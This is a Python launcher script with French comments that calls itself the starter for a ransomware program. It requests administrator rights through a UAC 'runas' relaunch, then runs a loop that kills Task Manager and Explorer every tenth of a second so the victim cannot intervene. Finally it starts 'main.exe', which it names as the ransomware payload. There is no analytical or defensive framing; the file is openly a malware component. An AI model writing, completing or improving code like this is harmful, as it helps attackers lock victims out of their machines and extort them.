import os, time, sys, ctypes, threading

# Fonction pour vérifier si l'utilisateur est administrateur
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# Fonction pour kill le tskmngr et l'explorer [Temporairement down pour régler le problème des cmd qui s'ouvrent et qui se ferment]
def KillTaskManager():
    pass
    while True:
        os.system("taskkill /F /IM Taskmgr.exe")
        os.system("taskkill /F /IM explorer.exe")
        time.sleep(0.1)

# Threads
killtskmng = threading.Thread(target=KillTaskManager)

# Liste des threads
threads = [killtskmng]

# Si l'utilisateur est administrateur
if is_admin():
    
    # Lancer les threads un par un
    for thread in threads: thread.start()
    for thread in threads: thread.join()
    
    # Lancer le ransommware
    os.system("start main.exe")
    
else:
    # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)